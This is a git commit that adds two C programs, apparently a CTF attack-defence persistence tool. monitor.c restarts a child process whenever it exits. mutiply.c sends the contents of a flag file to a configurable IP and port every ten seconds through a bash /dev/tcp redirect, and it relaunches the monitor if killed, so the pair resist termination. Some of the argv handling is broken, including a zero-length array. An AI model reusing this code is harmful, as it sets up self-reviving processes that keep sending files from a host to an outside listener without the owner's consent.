0cd5b407046cc15a0db73e382038ac59a1478938
A1Lin <418912399@qq.com>
2018-09-19 04:30:39 -0700

    commit

---
+++ monitor.c
@@ -0,0 +1,50 @@
+/*check child process's status, restart it when find it exit*/
+
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/wait.h>
+#include <stdio.h>
+#include <string.h>
+
+
+/*example, modify by yourself*/
+char *child_process = "./mutiply";
+char *args[1] = {NULL};
+
+int main(int argc, char **argv)
+{
+	pid_t pid;
+	
+	args[0] = child_process;
+
+	while(1)
+	{
+		pid = fork();
+		if(pid < 0)
+		{
+			fprintf(stderr, "fork failed\n");
+			continue;
+		}
+		else if(pid > 0)//father
+		{
+			printf("child's pid: [%d]\n", pid);
+			pid = wait(NULL);
+			printf("child process %d exit\n", pid);
+			
+		}
+		else//child
+		{
+			pid_t ppid = getppid();
+			printf("father's pid: [%d]\n", ppid);
+			int ret = execve(child_process, args, NULL);
+			if(ret < 0)
+			{
+				fprintf(stderr, "execve failed.\n");
+				exit(1);	
+			}
+			exit(0);
+		}
+	}
+	
+	return 0;
+} 
---
+++ mutiply.c
@@ -0,0 +1,63 @@
+/*run as a child porcess, fork and monitor by farther process*/
+/*two thread, one reverse flag to your listeng port, the other check farther process's staus*/
+#include <pthread.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <time.h>
+#include <string.h>
+#include <sys/wait.h>
+
+/*examples, modify by yourself*/
+char  *flag_path = "./flag";
+char *ip = "127.0.0.1";
+char *port = "10000";
+char *father_process = "./monitor";
+char *args[0] = {NULL};
+
+void get_flag();
+void check_father_state();
+
+int main(int argc, char **argv){
+	pthread_t thread1, thread2;
+	int thrd1, thrd2;
+	int i;
+	
+	args[0] = father_process;
+	
+	thrd1 = pthread_create(&thread1, NULL, (void *)&check_father_state, NULL);
+	thrd2 = pthread_create(&thread2, NULL, (void *)&get_flag, NULL);
+
+	if(thrd1 != 0 || thrd2 != 0)
+	{
+		fprintf(stderr, "thread create failed\n");
+	}
+
+	pthread_join(thread1, NULL);
+	pthread_join(thread2, NULL);
+
+	return 0;
+}
+
+void check_father_state()
+{
+	pid_t ppid = getppid();
+	while(getppid() == ppid){
+		//printf("ppid: [%d]\n",getppid());
+		usleep(500);
+	}
+	execve(father_process, args, NULL);
+}
+
+
+void get_flag()
+{
+	char command[128];
+	snprintf(command, 128, "bash -c '/bin/cat %s >& /dev/tcp/%s/%s 0>&1'", flag_path, ip, port);
+	while(1)
+	{
+		system(command);
+		sleep(10);	
+	}
+	
+}
